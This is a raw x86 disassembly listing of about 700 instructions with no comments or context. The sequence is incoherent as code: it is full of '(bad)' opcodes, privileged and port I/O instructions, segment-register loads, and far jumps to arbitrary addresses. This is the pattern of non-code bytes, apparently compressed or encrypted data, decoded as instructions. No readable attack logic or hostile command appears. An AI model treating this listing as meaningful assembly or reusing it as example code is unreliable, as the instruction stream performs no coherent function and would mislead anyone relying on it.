  41e0d7:	cmp    eax,0xa0e63880
  41e0dc:	aaa    
  41e0dd:	dec    edx
  41e0de:	push   esi
  41e0df:	jg     0x41e145
  41e0e1:	mov    BYTE PTR [edx-0x28],dh
  41e0e4:	popa   
  41e0e5:	popa   
  41e0e6:	sbb    al,0xc6
  41e0e8:	fild   WORD PTR [edx+0x11]
  41e0eb:	ins    BYTE PTR es:[edi],dx
  41e0ec:	add    DWORD PTR [eax+0x19],edx
  41e0ef:	js     0x41e0ba
  41e0f1:	fisub  DWORD PTR [ebp-0x57dcd908]
  41e0f7:	jp     0x41e130
  41e0f9:	iret   
  41e0fa:	mov    WORD PTR [edi-0x45],cs
  41e0fd:	mov    ds:0x1b95ed70,eax
  41e102:	xchg   esi,eax
  41e103:	cmp    dh,dh
  41e105:	jge    0x41e0c2
  41e107:	mov    BYTE PTR [edx+0x371bea53],bh
  41e10d:	outs   dx,DWORD PTR ds:[esi]
  41e10e:	rcr    esi,1
  41e110:	pop    esi
  41e111:	pop    gs
  41e113:	and    BYTE PTR [ebp-0x73b44c96],ah
  41e119:	mov    ecx,0x15cde4c8
  41e11e:	pop    esi
  41e11f:	mov    dh,0xc2
  41e121:	dec    esp
  41e122:	imul   edi,edx,0xf4dbfef8
  41e128:	loop   0x41e16b
  41e12a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e12b:	test   DWORD PTR [edx],ebp
  41e12d:	or     BYTE PTR [ecx],ah
  41e12f:	add    al,0x84
  41e131:	neg    BYTE PTR [esp+ecx*2-0x278bed2a]
  41e138:	mov    al,ds:0x5590a19
  41e13d:	in     eax,dx
  41e13e:	xor    ecx,DWORD PTR [ebp+0x39]
  41e141:	sahf   
  41e142:	pop    ss
  41e143:	pop    eax
  41e144:	cmp    eax,0x1c278855
  41e149:	mov    edx,0x1b021fd7
  41e14e:	in     al,dx
  41e14f:	popa   
  41e150:	adc    eax,0x45a88205
  41e155:	inc    esi
  41e156:	cmp    al,0xb5
  41e158:	mov    eax,ds:0x36296273
  41e15d:	xchg   ebp,eax
  41e15e:	mov    al,0xf3
  41e160:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e161:	pop    esi
  41e162:	fdiv   QWORD PTR [edi-0x7e3ad072]
  41e168:	stos   DWORD PTR es:[edi],eax
  41e169:	xchg   DWORD PTR [edi-0x3e],edi
  41e16c:	pop    ecx
  41e16d:	sub    edi,DWORD PTR [ebp+0x5d391222]
  41e173:	ret    0x3634
  41e176:	cmp    esp,DWORD PTR [edx-0x3d]
  41e179:	jae    0x41e1ea
  41e17b:	std    
  41e17c:	sub    BYTE PTR [ecx],0x3f
  41e17f:	jno    0x41e12d
  41e181:	mov    bh,0x95
  41e183:	dec    esi
  41e184:	rol    DWORD PTR [ecx],0x49
  41e187:	jbe    0x41e151
  41e189:	adc    DWORD PTR [esi-0x7a],esp
  41e18c:	aaa    
  41e18d:	xlat   BYTE PTR ds:[ebx]
  41e18e:	pusha  
  41e18f:	or     BYTE PTR ds:0xb720a5a4,bl
  41e195:	popf   
  41e196:	lods   al,BYTE PTR ds:[esi]
  41e197:	xchg   ebx,eax
  41e198:	adc    BYTE PTR [edi],al
  41e19a:	or     eax,eax
  41e19c:	sbb    eax,0xbcdb257d
  41e1a1:	and    BYTE PTR [ecx],dh
  41e1a3:	pop    ds
  41e1a4:	dec    eax
  41e1a5:	test   BYTE PTR [ebx],0x1a
  41e1a8:	sti    
  41e1a9:	push   ss
  41e1aa:	hlt    
  41e1ab:	(bad)  
  41e1ae:	sar    DWORD PTR [edi],0xfc
  41e1b1:	int3   
  41e1b2:	dec    ebp
  41e1b3:	push   ds
  41e1b4:	popa   
  41e1b5:	out    0x85,al
  41e1b7:	shr    BYTE PTR [ecx-0x1a],1
  41e1ba:	cs mov edx,0x526f73f0
  41e1c0:	jge    0x41e217
  41e1c2:	imul   edx,esi,0xffffff90
  41e1c5:	das    
  41e1c6:	rol    BYTE PTR [esi-0x80],cl
  41e1c9:	mov    dh,0x80
  41e1cb:	mov    edx,0x6ed51815
  41e1d0:	lea    edi,[edx+edi*8+0x61066c]
  41e1d7:	aad    0xba
  41e1d9:	imul   ebp,DWORD PTR [esi+0x6d0b06b7],0x71
  41e1e0:	pop    ebp
  41e1e1:	lock add BYTE PTR [ecx],al
  41e1e4:	sbb    esi,DWORD PTR [ecx]
  41e1e6:	in     al,dx
  41e1e7:	aad    0x11
  41e1e9:	xor    al,0xb7
  41e1eb:	jnp    0x41e17f
  41e1ed:	test   BYTE PTR [edx-0x8],al
  41e1f0:	adc    cl,ch
  41e1f2:	push   ebx
  41e1f3:	sub    BYTE PTR [ecx+0xf],dh
  41e1f6:	push   0x621c7361
  41e1fb:	push   ebp
  41e1fc:	inc    esi
  41e1fd:	call   FWORD PTR [ebx]
  41e1ff:	adc    DWORD PTR [esi],edx
  41e201:	dec    edi
  41e202:	in     eax,dx
  41e203:	jp     0x41e21a
  41e205:	lahf   
  41e206:	aad    0x73
  41e208:	mov    al,ds:0x94d8c1fd
  41e20d:	jge    0xafe51662
  41e213:	sub    ah,0xc6
  41e216:	in     al,dx
  41e217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e218:	lods   eax,DWORD PTR ds:[esi]
  41e219:	cmp    DWORD PTR [ebx+0x33],esi
  41e21c:	(bad)  
  41e21d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e21e:	lds    edi,FWORD PTR [ecx+0x17]
  41e221:	jb     0x41e25c
  41e223:	sub    ch,BYTE PTR [esi-0xe]
  41e226:	cwde   
  41e227:	mov    cl,BYTE PTR [esi-0x48]
  41e22a:	pop    esi
  41e22b:	das    
  41e22c:	fmul   QWORD PTR [edx-0x4a79c68c]
  41e232:	or     eax,0x555c6797
  41e237:	mov    ds:0x6d4002d3,al
  41e23c:	nop
  41e23d:	mov    esp,0x8ca1ba8
  41e242:	and    al,0xd3
  41e244:	sub    edx,DWORD PTR [edx]
  41e246:	jmp    0x41e213
  41e248:	xrelease mov DWORD PTR [ebp-0x4546926e],0x4adb3275
  41e253:	or     edx,edi
  41e255:	mov    edx,0x5ed113bd
  41e25a:	push   eax
  41e25b:	mov    bh,0x40
  41e25d:	or     eax,0x232bc309
  41e262:	jp     0x41e249
  41e264:	(bad)  
  41e265:	cmp    eax,0x1c47f733
  41e26a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e26b:	sub    ah,dh
  41e26d:	xchg   ecx,eax
  41e26e:	xor    al,ch
  41e270:	cmp    bh,bh
  41e272:	fcmovnu st,st(0)
  41e274:	ins    DWORD PTR es:[edi],dx
  41e275:	lock add DWORD PTR [ecx+0x35],ebx
  41e279:	add    DWORD PTR [edi+eax*2-0x66254579],edi
  41e280:	pushf  
  41e281:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e282:	mov    bh,0xb
  41e284:	fs cld 
  41e286:	inc    ebx
  41e287:	fdivr  st(3),st
  41e289:	leave  
  41e28a:	in     al,0x9c
  41e28c:	inc    ebp
  41e28d:	push   esp
  41e28e:	jne    0x41e229
  41e290:	aaa    
  41e291:	xchg   edx,eax
  41e292:	xor    al,0xbb
  41e294:	repnz in eax,dx
  41e296:	xchg   esp,eax
  41e297:	cli    
  41e298:	icebp  
  41e299:	int    0x61
  41e29b:	mov    ah,0x1
  41e29d:	cwde   
  41e29e:	mov    DWORD PTR [esi+0xbd874ec],ebp
  41e2a4:	push   0x17c6d723
  41e2a9:	out    dx,al
  41e2aa:	loope  0x41e2dd
  41e2ac:	xchg   esp,eax
  41e2ad:	je     0x41e2d5
  41e2af:	pushf  
  41e2b0:	add    ah,BYTE PTR [edi-0x65]
  41e2b3:	jge    0x41e2d3
  41e2b5:	lea    ebx,[eax+0x22]
  41e2b8:	jge    0x41e2a8
  41e2ba:	xor    ecx,DWORD PTR [ebx+0x6477368f]
  41e2c0:	pop    ss
  41e2c1:	data16 loop 0x41e273
  41e2c4:	mov    esp,DWORD PTR [ebx]
  41e2c6:	std    
  41e2c7:	hlt    
  41e2c8:	and    ecx,eax
  41e2ca:	arpl   WORD PTR [eax],dx
  41e2cc:	fnsave fs:[esi-0x3abc5352]
  41e2d3:	inc    esp
  41e2d4:	dec    ecx
  41e2d5:	loop   0x41e27a
  41e2d7:	or     al,0xe1
  41e2d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2da:	sar    DWORD PTR [esi-0x438fca3e],1
  41e2e0:	adc    eax,0x86819305
  41e2e5:	ret    0x1c6a
  41e2e8:	pop    es
  41e2e9:	fadd   DWORD PTR [esi-0x481c0d55]
  41e2ef:	fstp   DWORD PTR ds:0x6fa0e1cc
  41e2f5:	xor    al,0x91
  41e2f7:	push   esi
  41e2f8:	cmp    ebx,DWORD PTR ds:0x82d0a7c8
  41e2fe:	mov    ch,0x9d
  41e300:	and    ax,0xc3b8
  41e304:	dec    esi
  41e305:	mov    ds:0xcd38c232,al
  41e30a:	stos   BYTE PTR es:[edi],al
  41e30b:	push   ss
  41e30c:	(bad)  
  41e30d:	ja     0x41e2f5
  41e30f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e310:	cmc    
  41e311:	add    al,dl
  41e313:	jg     0x41e31c
  41e315:	cs jae 0x41e29f
  41e318:	add    edi,DWORD PTR [ecx]
  41e31a:	in     eax,0x41
  41e31c:	outs   dx,DWORD PTR ds:[esi]
  41e31d:	inc    DWORD PTR [ebx-0x1]
  41e320:	adc    esp,DWORD PTR [ecx+0x39676b13]
  41e326:	mov    BYTE PTR [esi-0x4a],cl
  41e329:	add    edx,DWORD PTR [edx]
  41e32b:	sub    ebx,0x8754c88b
  41e331:	mov    cl,0xfb
  41e333:	xchg   DWORD PTR [edi-0x2d],eax
  41e336:	stc    
  41e337:	aaa    
  41e338:	or     DWORD PTR [ebx+edi*4+0x4c8811d6],0xfffffff5
  41e340:	lds    esi,FWORD PTR [ebp-0x5e2f3665]
  41e346:	pop    ecx
  41e347:	lea    ecx,[eax-0x44]
  41e34a:	(bad)  [edx]
  41e34c:	pop    ebx
  41e34d:	cwde   
  41e34e:	ss retf 0xa4a8
  41e352:	lods   al,BYTE PTR ds:[esi]
  41e353:	pop    esi
  41e354:	adc    DWORD PTR [eax+0x651ec620],0x8e5f6b2c
  41e35e:	inc    esp
  41e35f:	xchg   ebp,eax
  41e360:	xchg   ecx,eax
  41e361:	out    dx,eax
  41e362:	gs je  0x41e3b9
  41e365:	push   0x5422626
  41e36a:	fmul   DWORD PTR [ebp-0x10]
  41e36d:	bound  edx,QWORD PTR [ebx+0x71]
  41e370:	add    ebp,edx
  41e372:	loope  0x41e3d0
  41e374:	call   0xfdd4:0x4a534619
  41e37b:	adc    dl,dh
  41e37d:	retf   
  41e37e:	fs data16 (bad) 
  41e381:	jo     0x41e3da
  41e383:	std    
  41e384:	hlt    
  41e385:	jne    0x41e360
  41e387:	mov    edi,gs
  41e389:	cmc    
  41e38a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e38b:	jl     0x41e316
  41e38d:	add    eax,DWORD PTR [ecx-0x6e83fc4e]
  41e393:	jmp    0x41e317
  41e395:	and    esi,esp
  41e397:	adc    BYTE PTR [edi-0x58],ah
  41e39a:	stc    
  41e39b:	xor    BYTE PTR [edx],ah
  41e39d:	push   esi
  41e39e:	push   cs
  41e39f:	cmp    BYTE PTR [ebp-0x6a],ah
  41e3a2:	aad    0xd0
  41e3a4:	mov    dl,0x28
  41e3a6:	and    al,0xda
  41e3a8:	xor    al,0xf5
  41e3aa:	mov    dh,0xeb
  41e3ac:	sub    al,0xa5
  41e3ae:	test   eax,0xf266f1a
  41e3b3:	mov    ecx,0x55a22ccd
  41e3b8:	arpl   WORD PTR [ecx-0x3c],bx
  41e3bb:	(bad)  
  41e3bd:	cld    
  41e3be:	in     eax,0x27
  41e3c0:	test   eax,0xe5308091
  41e3c5:	test   BYTE PTR [ecx],0xdb
  41e3c8:	ret    
  41e3c9:	inc    esp
  41e3ca:	cmp    ch,cl
  41e3cc:	loop   0x41e365
  41e3ce:	outs   dx,DWORD PTR ds:[esi]
  41e3cf:	sbb    al,0xb1
  41e3d1:	das    
  41e3d2:	mov    WORD PTR [edi],ss
  41e3d4:	stos   DWORD PTR es:[edi],eax
  41e3d5:	sbb    ah,BYTE PTR [ebx-0x74]
  41e3d8:	ret    
  41e3d9:	pop    ds
  41e3da:	fimul  WORD PTR [eax+0x1db8ade]
  41e3e0:	jb     0x41e371
  41e3e2:	cmp    eax,ebp
  41e3e4:	mov    edx,0x6b508b1
  41e3e9:	jne    0x41e450
  41e3eb:	call   0xa65e:0xbe03677
  41e3f2:	mov    ss,WORD PTR [edi-0x62]
  41e3f5:	xor    DWORD PTR [ebp+0x3b],eax
  41e3f8:	add    eax,eax
  41e3fa:	dec    esp
  41e3fb:	ds std 
  41e3fd:	and    esi,ebp
  41e3ff:	add    BYTE PTR [ebx-0x18],dh
  41e402:	pop    es
  41e403:	mov    eax,ds:0x880f7d29
  41e408:	sbb    edx,ebp
  41e40a:	adc    eax,0x7dcc9cc4
  41e40f:	pop    ecx
  41e410:	xchg   BYTE PTR [edx],ah
  41e412:	sub    DWORD PTR [ecx],ecx
  41e414:	rol    dl,cl
  41e416:	sbb    DWORD PTR [edx+0x2e],esi
  41e419:	xchg   ebx,eax
  41e41a:	jge    0x41e468
  41e41c:	imul   ebx,eax,0x6f9fc5e0
  41e422:	test   DWORD PTR [eax],ebx
  41e424:	mov    ebp,0x8baceb4
  41e429:	xor    BYTE PTR [ecx-0x25],al
  41e42c:	js     0x41e43c
  41e42e:	popa   
  41e42f:	pop    ecx
  41e430:	stos   DWORD PTR es:[edi],eax
  41e431:	cmp    al,0xc8
  41e433:	popa   
  41e434:	stos   DWORD PTR es:[edi],eax
  41e435:	sbb    DWORD PTR [esi-0x6e],edx
  41e438:	inc    DWORD PTR [eax+ecx*4-0x2a]
  41e43c:	test   DWORD PTR [edx+eax*1-0x48],esp
  41e440:	dec    eax
  41e441:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e442:	out    0xbe,al
  41e444:	dec    edx
  41e445:	out    0x64,eax
  41e447:	push   0xffffffe3
  41e449:	jp     0x41e46d
  41e44b:	pop    ss
  41e44c:	div    DWORD PTR [ecx+0x25c18b45]
  41e452:	xor    bh,ah
  41e454:	xchg   al,dl
  41e456:	gs imul esi,eax,0x23
  41e45a:	pushf  
  41e45b:	ins    DWORD PTR es:[edi],dx
  41e45c:	mov    edi,0xcf7a6eee
  41e461:	loop   0x41e425
  41e463:	or     eax,0xf19333e4
  41e468:	inc    esp
  41e469:	mov    cl,0x1
  41e46b:	repz adc ah,al
  41e46e:	jmp    0x5f2d8f20
  41e473:	inc    edi
  41e474:	add    BYTE PTR [ebx],0x99
  41e477:	in     al,dx
  41e478:	and    DWORD PTR [eax+0x3388a49c],0x77
  41e47f:	push   esi
  41e480:	xor    ebx,DWORD PTR [ebx+0x2f3fbe2e]
  41e486:	dec    eax
  41e487:	cld    
  41e488:	or     dl,BYTE PTR [eax-0xeda8342]
  41e48e:	je     0x41e449
  41e490:	mov    ebx,0x8bd8f2d0
  41e495:	inc    DWORD PTR [ebx]
  41e497:	(bad)  
  41e498:	call   0xd8cc4716
  41e49d:	mov    dl,0x40
  41e49f:	int3   
  41e4a0:	adc    ah,bl
  41e4a2:	(bad)  
  41e4a4:	pop    edx
  41e4a5:	pop    ebx
  41e4a6:	ret    
  41e4a7:	lea    eax,es:[edx+0x50e84c08]
  41e4ae:	mov    esp,0x621c2c99
  41e4b3:	xor    DWORD PTR [edx+0x3e],ecx
  41e4b6:	fdiv   QWORD PTR [ebp+0x7051af0b]
  41e4bc:	inc    edi
  41e4bd:	call   0xd317:0xb77bc4ab
  41e4c4:	enter  0x708c,0x70
  41e4c8:	lds    edi,FWORD PTR [ebp+0x9a28025]
  41e4ce:	jbe    0x41e4b9
  41e4d0:	dec    esi
  41e4d1:	mov    eax,0x78e23094
  41e4d6:	sbb    edx,eax
  41e4d8:	addr16 nop
  41e4da:	test   BYTE PTR [ebx],bl
  41e4dc:	lods   eax,DWORD PTR ds:[esi]
  41e4dd:	dec    edi
  41e4de:	pop    edi
  41e4df:	(bad)  
  41e4e0:	lods   al,BYTE PTR ds:[esi]
  41e4e1:	sbb    al,0x18
  41e4e3:	(bad)  [edx+0x66]
  41e4e6:	aam    0x87
  41e4e8:	or     bl,BYTE PTR [eax-0x5c4b424]
  41e4ee:	adc    eax,0x4fbd3e7d
  41e4f3:	cwde   
  41e4f4:	pushf  
  41e4f5:	sti    
  41e4f6:	or     al,BYTE PTR [edx+0x77]
  41e4f9:	fsub   DWORD PTR [eax]
  41e4fb:	jp     0x41e4b1
  41e4fd:	cmp    esi,DWORD PTR [ebx+0x63]
  41e500:	jecxz  0x41e50b
  41e502:	sar    dh,cl
  41e504:	xchg   edx,eax
  41e505:	mov    eax,0xe201740
  41e50a:	mov    cs,ecx
  41e50c:	inc    dl
  41e50e:	je     0x41e514
  41e510:	cmp    edx,DWORD PTR [esi+ebp*2-0x29ddd68c]
  41e517:	push   cs
  41e518:	in     al,0xe2
  41e51a:	mov    dh,0x84
  41e51c:	pop    es
  41e51d:	jl     0x41e58c
  41e51f:	mov    ebx,0xc957d3a
  41e524:	fwait
  41e525:	mov    ch,0x5
  41e527:	sub    DWORD PTR [ecx],edx
  41e529:	mov    bl,0x92
  41e52b:	out    0x1d,al
  41e52d:	push   es
  41e52e:	and    BYTE PTR [eax+0xc2fa173],ch
  41e534:	sub    eax,0x7c54dd89
  41e539:	and    al,dh
  41e53b:	inc    DWORD PTR [esi-0x4e]
  41e53e:	mov    BYTE PTR [edi+0x77f4703d],dl
  41e544:	xchg   DWORD PTR [edx-0xe],eax
  41e547:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e548:	push   edx
  41e549:	(bad)  
  41e54a:	arpl   cx,sp
  41e54c:	cmp    DWORD PTR [eax],0x28
  41e54f:	inc    ebp
  41e550:	xchg   ebp,eax
  41e551:	fwait
  41e552:	or     dh,al
  41e554:	mov    ds:0xda3e2e17,al
  41e559:	pusha  
  41e55a:	xor    eax,0x30b8588d
  41e55f:	and    ecx,esp
  41e561:	xor    eax,ecx
  41e563:	add    BYTE PTR [esi+0x49fa00fe],bh
  41e569:	test   eax,0xc34affe5
  41e56e:	xor    cl,BYTE PTR [edi-0x578d6467]
  41e574:	ins    BYTE PTR es:[edi],dx
  41e575:	enter  0xdae5,0x72
  41e579:	test   al,0xe4
  41e57b:	push   ecx
  41e57c:	adc    cl,BYTE PTR [edx]
  41e57e:	add    DWORD PTR [ecx],ebp
  41e580:	shr    DWORD PTR [edx],cl
  41e582:	jnp    0x41e517
  41e584:	js     0x41e52c
  41e586:	retf   0x893c
  41e589:	jo     0x41e545
  41e58b:	sbb    esi,DWORD PTR ds:0xefd00fc7
  41e591:	sbb    BYTE PTR [esi-0x28576a4a],0x4a
  41e598:	sub    dh,cl
  41e59a:	jg     0x41e57c
  41e59c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e59d:	pop    esi
  41e59e:	int    0x95
  41e5a0:	pop    edi
  41e5a1:	into   
  41e5a2:	mov    cs,ebx
  41e5a4:	mov    edx,0x56fe7294
  41e5a9:	or     esp,eax
  41e5ab:	out    0xed,eax
  41e5ad:	jbe    0x41e549
  41e5af:	pop    esi
  41e5b0:	mov    edi,0x7f6a74c6
  41e5b5:	retf   0x6bf6
  41e5b8:	jno    0x41e56f
  41e5ba:	sub    esp,ebx
  41e5bc:	cmp    BYTE PTR [edi-0x6d],dl
  41e5bf:	add    bh,0x69
  41e5c2:	sbb    ah,BYTE PTR [ecx]
  41e5c4:	or     DWORD PTR [edx+0x12],esp
  41e5c7:	push   ds
  41e5c8:	cld    
  41e5c9:	xor    edi,DWORD PTR [ebp+0x477751f9]
  41e5cf:	ins    BYTE PTR es:[edi],dx
  41e5d0:	nop
  41e5d1:	fistp  WORD PTR ds:0xcdda4d3d
  41e5d7:	mov    ss,ebx
  41e5d9:	mov    bl,0xe4
  41e5db:	mov    ebx,0x2d232e93
  41e5e0:	xor    eax,DWORD PTR [esp+eax*1]
  41e5e3:	xchg   DWORD PTR [esi+0x390d8c6d],ebx
  41e5e9:	sbb    eax,0xe546b9a9
  41e5ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5ef:	popa   
  41e5f0:	ss xchg esi,eax
  41e5f2:	rcr    BYTE PTR [ecx+edi*2+0x79],cl
  41e5f6:	nop
  41e5f7:	ret    
  41e5f8:	fidiv  WORD PTR [eax-0x47]
  41e5fb:	aaa    
  41e5fc:	aaa    
  41e5fd:	daa    
  41e5fe:	fcom   DWORD PTR cs:[eax-0x5f015c7c]
  41e605:	add    DWORD PTR [edx+0x7d2e7efe],ecx
  41e60b:	leave  
  41e60c:	inc    esp
  41e60d:	pop    es
  41e60e:	sub    DWORD PTR [edi-0x79],edx
  41e611:	mov    dh,0x32
  41e613:	mov    edx,0x5819f3c1
  41e618:	(bad)  
  41e619:	pop    esp
  41e61a:	lock mov eax,0x943366b5
  41e620:	or     al,0xf3
  41e622:	inc    edx
  41e623:	adc    BYTE PTR [ebp-0x3f],0x5b
  41e627:	out    0x62,eax
  41e629:	jno    0x41e5d2
  41e62b:	fnstsw WORD PTR [ecx]
  41e62d:	hlt    
  41e62e:	retf   0x77f9
  41e631:	sbb    al,0xde
  41e633:	push   esp
  41e634:	and    edi,ecx
  41e636:	ins    BYTE PTR es:[edi],dx
  41e637:	in     eax,dx
  41e638:	push   ebx
  41e639:	and    BYTE PTR [eax+0x1a],0x2b
  41e63d:	rol    BYTE PTR [ebx+0x1667df02],1
  41e643:	mov    eax,ds:0xaccc49ba
  41e648:	sbb    eax,DWORD PTR ds:0x1882d695
  41e64e:	adc    edx,DWORD PTR [edx]
  41e650:	enter  0x4e40,0x1f
  41e654:	pop    eax
  41e655:	adc    eax,0xdb789c32
  41e65a:	inc    eax
  41e65b:	in     eax,dx
  41e65c:	shr    DWORD PTR fs:[edx-0x58],1
  41e660:	in     al,dx
  41e661:	aas    
  41e662:	mov    WORD PTR [edx],ds
  41e664:	or     eax,0x129ec4c1
  41e669:	mov    eax,ds:0xe510cd21
  41e66e:	stos   BYTE PTR es:[edi],al
  41e66f:	bound  eax,QWORD PTR [ebx-0x136be88]
  41e675:	add    DWORD PTR [eax+0x7a],eax
  41e678:	lea    edx,[ecx]
  41e67a:	iret   
  41e67b:	sbb    al,0x17
  41e67d:	pop    ds
  41e67e:	ficom  WORD PTR [ebp-0x5d]
  41e681:	xor    BYTE PTR [edi+0x25],al
  41e684:	add    ebx,DWORD PTR [ebx-0x217701fd]
  41e68a:	into   
  41e68b:	push   ds
  41e68c:	in     eax,dx
  41e68d:	mov    bh,0x6b
  41e68f:	sbb    eax,0x96eae8e
  41e694:	lds    esp,FWORD PTR [eax-0x1c67d5f9]
  41e69a:	mov    ah,0x1e
  41e69c:	fcom   DWORD PTR [edx-0x6610181c]
  41e6a2:	mov    eax,DWORD PTR [esi+0x6f]
  41e6a5:	(bad)  
  41e6a6:	jp     0x41e6c8
  41e6a8:	js     0x41e6ab
  41e6aa:	daa    
  41e6ab:	mov    eax,0xd16328c8
  41e6b0:	mov    ebx,0x87720c
  41e6b5:	cmp    bh,BYTE PTR [ebx+0x37]
  41e6b8:	ror    BYTE PTR [ecx+ebp*1-0x6e],0xcd
  41e6bd:	popa   
  41e6be:	outs   dx,DWORD PTR ds:[esi]
  41e6bf:	pop    edx
  41e6c0:	or     ecx,DWORD PTR [eax]
  41e6c2:	imul   ebp,DWORD PTR [edi+0x12b5f9cb],0x99ea6b12
  41e6cc:	clc    
  41e6cd:	(bad)  
  41e6ce:	lea    edx,[ebp-0x1b]
  41e6d1:	ins    BYTE PTR es:[edi],dx
  41e6d2:	sahf   
  41e6d3:	imul   esi,esi,0x6
  41e6d6:	fld    QWORD PTR [ebx+0x39d629f]
  41e6dc:	pop    ebp
  41e6dd:	daa    
  41e6de:	pushf  
  41e6df:	shr    edi,cl
  41e6e1:	mov    es,WORD PTR [eax+ecx*4+0x50]
  41e6e5:	stc    
  41e6e6:	sbb    BYTE PTR ds:0x155d6654,bl
  41e6ec:	mov    ah,0xd1
  41e6ee:	xor    esp,DWORD PTR [edi+edi*1]
  41e6f1:	outs   dx,BYTE PTR ds:[esi]
  41e6f2:	push   ds
  41e6f3:	aas    
  41e6f4:	xor    ch,BYTE PTR [edx]
  41e6f6:	jecxz  0x41e6b0
  41e6f8:	iret   
  41e6f9:	loopne 0x41e758
  41e6fb:	cmp    edx,DWORD PTR [edx+0x0]
  41e6fe:	fnstenv [eax-0x1a46442e]
  41e704:	int    0x9e
  41e706:	fidiv  DWORD PTR [edx-0x3c]
  41e709:	aam    0xda
  41e70b:	enter  0x1e95,0xe2
  41e70f:	and    eax,0x9d3d4f3a
  41e714:	lds    eax,FWORD PTR [eax+eiz*1+0x4560b018]
  41e71b:	jno    0x41e728
  41e71d:	int3   
  41e71e:	inc    edi
  41e71f:	push   cs
  41e720:	mov    ds:0x26ba3dd8,eax
  41e725:	push   0x64
  41e727:	mov    edi,0x1b0a6e5
  41e72c:	int3   
  41e72d:	adc    ebx,ecx
  41e72f:	xor    BYTE PTR [edx+0x142e9d7d],0x4c
  41e736:	push   edx
  41e737:	mov    DWORD PTR [edi+0x30],ecx
  41e73a:	cmp    al,0xe5
  41e73c:	mov    ebx,0xd28018fa
  41e741:	in     al,dx
  41e742:	pop    ss
  41e743:	push   0xfffffff2
  41e745:	push   ss
  41e746:	and    DWORD PTR [eax+0x19a88b85],ebp
  41e74c:	dec    esi
  41e74d:	jmp    0x3374:0x45bb5e59
  41e754:	mov    esi,0x4f809680
  41e759:	fst    DWORD PTR [edi+0x1890d58e]
  41e75f:	cmp    edx,DWORD PTR [ecx-0x1]
  41e762:	jb     0x41e747
  41e764:	add    al,0x81
  41e766:	stos   BYTE PTR es:[edi],al
  41e767:	xchg   esp,eax
  41e768:	mov    ds:0x4529fd87,eax
  41e76d:	push   ecx
  41e76e:	scas   eax,DWORD PTR es:[edi]
  41e76f:	cmp    al,0x32
  41e771:	fsubr  st,st(4)
  41e773:	adc    DWORD PTR ds:0x74ce38a2,ebx
  41e779:	jmp    0xc4d1:0xb0a2618e
  41e780:	xchg   esp,eax
  41e781:	mov    al,0xff
  41e783:	mov    bl,0x51
  41e785:	int3   
  41e786:	popf   
  41e787:	stc    
  41e788:	inc    esp
  41e789:	xchg   edx,eax
  41e78a:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e78c:	sbb    eax,0xb8afa100
  41e791:	loop   0x41e7e6
  41e793:	inc    esp
  41e794:	mov    esp,DWORD PTR [ecx]
  41e796:	imul   edx,DWORD PTR [ebp+0x14],0x7923d321
  41e79d:	pop    ebp
  41e79e:	push   esp
  41e79f:	add    al,0x24
  41e7a1:	mov    ebp,0x72412981
  41e7a6:	jo     0x41e7b1
  41e7a8:	or     ch,ah
  41e7aa:	popa   
  41e7ab:	in     eax,0x82
  41e7ad:	clc    
  41e7ae:	rcl    DWORD PTR [ebx+eiz*8-0x74e2f1ce],0xbe
  41e7b6:	or     al,0x52
  41e7b8:	push   ds
  41e7b9:	jge    0x41e771
  41e7bb:	test   DWORD PTR [ecx+ebx*4],eax
  41e7be:	or     bh,BYTE PTR [ebp-0x5b84868b]
  41e7c4:	xor    bl,BYTE PTR [edx+0x71b776db]
  41e7ca:	aaa    
  41e7cb:	popa   
  41e7cc:	in     eax,dx
  41e7cd:	xchg   esi,eax
  41e7ce:	adc    esp,DWORD PTR [ebx+edx*4-0xd]
  41e7d2:	pop    es
  41e7d3:	mov    DWORD PTR [ecx],esi
  41e7d5:	sbb    DWORD PTR ds:0xb6c60ff8,0xffffffcc
  41e7dc:	ror    DWORD PTR [edi+0x77],cl
  41e7df:	lahf   
  41e7e0:	cmp    al,0xbc
  41e7e2:	shl    ebx,1
  41e7e4:	inc    esi
  41e7e5:	push   ebx
  41e7e6:	or     ebp,DWORD PTR [edx-0x4b]
  41e7e9:	jle    0x41e806
  41e7eb:	(bad)  
  41e7ec:	arpl   WORD PTR [edi-0x6c],sp
  41e7ef:	or     eax,0xbc13b43b
  41e7f4:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7f6:	jb     0x41e7d0
  41e7f8:	mov    BYTE PTR [ebx-0x24a87e0a],dl
  41e7fe:	or     edx,DWORD PTR [esi-0x43]
  41e801:	mov    cl,BYTE PTR [esi]
  41e803:	jg     0x41e7e8
  41e805:	rol    BYTE PTR [edx+edx*1-0x166ad7e7],cl
  41e80c:	fdivr  DWORD PTR [ebp-0x3bb231df]
  41e812:	sub    BYTE PTR [esi-0x73],ah
  41e815:	js     0x41e7f4
  41e817:	sbb    DWORD PTR [esi],esp
  41e819:	jp     0x41e7ec
  41e81b:	in     al,0xa8
  41e81d:	push   ebp
  41e81e:	sub    BYTE PTR [ebp+0x10],dl
  41e821:	adc    BYTE PTR [ebp+0x9d7d314],ah
  41e827:	aad    0xd1
  41e829:	xchg   ebp,eax
  41e82a:	mov    BYTE PTR [edi],ch
  41e82c:	loope  0x41e7e4
  41e82e:	xchg   esp,eax
  41e82f:	imul   esp,DWORD PTR [ebp+0x6c305715],0x1c03b9a4
  41e839:	out    0x46,al
  41e83b:	jne    0x41e7e9
  41e83d:	addr16 js 0x41e887
  41e840:	pop    esi
  41e841:	inc    edx
  41e842:	dec    BYTE PTR [ebp-0x7837764d]
  41e848:	sbb    ebp,DWORD PTR [ebx+0x4d]
  41e84b:	xchg   edx,eax
  41e84c:	push   0xffffffa9
  41e84e:	pop    esi
